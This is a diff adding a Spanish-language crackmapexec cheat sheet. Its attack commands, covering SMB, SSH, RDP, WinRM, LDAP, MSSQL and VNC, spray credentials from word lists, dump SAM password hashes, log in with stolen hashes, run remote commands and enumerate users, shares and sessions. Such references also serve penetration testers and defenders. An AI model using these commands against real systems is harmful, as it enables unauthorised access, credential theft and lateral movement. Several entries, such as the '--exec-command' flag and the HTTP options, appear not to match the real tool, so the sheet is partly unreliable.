@@ -1,0 +1,65 @@
+SMB:
+
+Verificar disponibilidad: crackmapexec smb <IP>
+   
+Probar credenciales desde archivos: crackmapexec smb <IP> -u usuarios.txt -p claves.txt
+
+Enumerar recursos compartidos: crackmapexec smb <IP> -u usuario -p clave --shares
+
+Enumerar usuarios: crackmapexec smb <IP> -u usuario -p clave --users
+
+Enumerar grupos: crackmapexec smb <IP> -u usuario -p clave --groups
+
+Obtener políticas de contraseñas: crackmapexec smb <IP> -u usuario -p clave --policy
+Ejecutar comando en SMB: crackmapexec smb <IP> -u usuario -p clave --exec-command "comando"
+
+Extraer hashes de contraseñas: crackmapexec smb <IP> -u usuario -p clave --sam
+
+Usar un hash en lugar de una contraseña: crackmapexec smb <IP> -u usuario -H hash
+
+Enumerar sesiones activas: crackmapexec smb <IP> -u usuario -p clave --sessions
+
+HTTP:
+
+Verificar disponibilidad: crackmapexec http <IP>
+
+Probar autenticación con ruta: crackmapexec http <IP> -u usuario -p clave --path "/ruta"
+
+Enumerar directorios: crackmapexec http <IP> --enumerate
+
+SSH:
+Probar credenciales desde archivos: crackmapexec ssh <IP> -u usuarios.txt -p claves.txt
+
+Ejecutar comando remoto: crackmapexec ssh <IP> -u usuario -p clave --exec-command "comando"
+
+
+
+RDP:
+
+Verificar disponibilidad: crackmapexec rdp <IP>
+
+Probar credenciales: crackmapexec rdp <IP> -u usuario -p clave
+
+WinRM:
+
+Ejecutar comando remoto: crackmapexec winrm <IP> -u usuario -p clave --exec-command "comando"
+
+Enumerar usuarios: crackmapexec winrm <IP> -u usuario -p clave --users
+
+LDAP:
+
+Enumerar usuarios: crackmapexec ldap <IP> -u usuario -p clave --users
+
+MSSQL:
+Probar credenciales: crackmapexec mssql <IP> -u usuario -p clave
+
+VNC:
+Verificar disponibilidad: crackmapexec vnc <IP>
+
+Probar credenciales: crackmapexec vnc <IP> -u usuario -p clave
+
+Comandos Generales:
+
+Ver todas las opciones y módulos: crackmapexec --help
+
+Ayuda específica para un módulo: crackmapexec <servicio> --help
